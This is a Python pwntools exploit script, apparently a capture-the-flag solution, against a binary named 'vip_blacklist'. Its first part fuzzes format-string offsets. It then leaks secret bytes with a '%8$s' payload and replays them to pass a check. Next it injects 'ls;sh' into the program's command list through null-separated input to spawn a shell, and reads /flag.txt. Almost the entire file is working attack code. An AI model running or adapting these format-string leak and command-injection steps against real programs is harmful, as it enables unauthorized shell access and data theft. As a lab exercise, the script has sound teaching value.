from pwn import *

elf = context.binary = ELF('./vip_blacklist', checksec=False)

res = {}
def fuzz(n,compare):
    for i in range(n):
        try:
            p = process(level='error')
            p.recvuntil(b'exit')
            p.recvline();
            p.sendline('%{}$s'.format(i).encode())
            p.recvuntil(b'Executing: ')

            result = p.recvuntil(b'...',drop=True)
            if compare:
                if(res[i]!=result and len(result)==10):
                    print("\nBytes differ:")
                    print(str(i)+': '+str(res[i]))
                else:
                    res[i]=result
            else:
                res[i]=result
            p.close()
        except EOFError:
            res[i]="Error"
            pass

def fuzzDriver():

    confidenceCount = 5;
    for _ in range(confidenceCount):
        fuzz(15,False)
        fuzz(15,True)
        print("\nCompleted fuzzing\n")
    exit()


# fuzzDriver();

"""
 Determine memory offset to leak 
 Then comment out fuzzDriver call
 Substitute in payload
"""



# p = remote("<host>",<ip>)
p = process(level='error')

payload=b"%8$s"
p.recvuntil(b'exit')
p.sendline(payload)

p.recvuntil(b"Executing: ")

# bytes leak, bypass, and exploit
encryptionBytes = p.recvuntil(b"...",drop=True)
print("Received: ",encryptionBytes)
p.recvuntil(b"ls")
print("Sending: ",encryptionBytes)
p.sendline(encryptionBytes)
payload=b'queue\0clear\0exit\0\0ls;sh\0'
p.recvuntil(b'exit')
p.sendline(payload)
p.recvuntil(b"sh");
p.sendline(b"ls;sh");

p.sendline(b"cat /flag.txt");
p.sendline(b"exit");
p.interactive()
